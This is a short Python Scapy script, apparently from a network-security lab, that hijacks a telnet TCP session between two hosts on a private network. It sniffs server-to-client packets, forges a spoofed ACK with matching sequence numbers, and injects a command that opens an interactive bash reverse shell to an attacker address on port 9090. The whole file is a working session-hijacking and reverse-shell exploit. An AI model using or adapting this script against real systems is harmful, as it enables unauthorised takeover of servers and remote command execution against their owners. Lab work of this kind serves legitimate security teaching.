#!/usr/bin/python3
from scapy.all import *

server  = "10.9.0.2"   # Server IP
client  = "10.9.0.3"   # Client IP
PORT = 23             # Server telnet port

def spoof(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]

    #############################################
    ip = IP(src = old_ip.dst, dst = old_ip.src)
    tcp = TCP(sport = old_tcp.dport, dport = old_tcp.sport, seq = old_tcp.ack, ack = old_tcp.seq + len(old_tcp.payload), flags = "A")
    data = "\r/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
    #############################################

    pkt = ip/tcp/data
    send(pkt,verbose=0)
    ls(pkt)
    quit()

f = 'tcp and src host {} and dst host {} and src port {}'.format(server, client, PORT)
sniff(filter=f, prn=spoof, iface="br-6c895804349d")
